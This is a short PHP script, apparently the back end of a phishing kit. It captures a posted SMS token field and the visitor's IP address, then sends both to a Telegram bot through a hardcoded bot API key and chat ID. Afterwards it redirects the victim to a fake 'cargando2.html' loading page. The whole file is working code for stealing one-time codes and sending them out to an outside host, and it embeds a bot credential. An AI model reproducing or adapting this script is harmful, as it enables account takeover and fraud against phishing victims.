<?php
// Recoger los datos del formulario
$correo = $_POST['sms'];


$ip = $_SERVER['REMOTE_ADDR']; // Obtener la dirección IP del cliente

// API key del chatbot de Telegram
$bot_api_key = '7035738467:AAGFFEZgbQtUmDD97yRdADdsLp04BIJPmeI';

// ID del chat al que se enviará el mensaje
$chat_id = '-1002214525990';

// Mensaje que se enviará al chatbot
$mensaje_para_chatbot = "🇻🇪🔑📍token📍🔑🇻🇪\n" . "🔑tok: " . $correo .  "\n🌏: " . $ip;

// URL de la API de Telegram para enviar mensajes
$telegram_url = "https://api.telegram.org/bot" . $bot_api_key . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($mensaje_para_chatbot);

// Enviar el mensaje al chatbot de Telegram
$response = file_get_contents($telegram_url);

// Redirigir a index.php
header("Location: cargando2.html");
exit;

?>
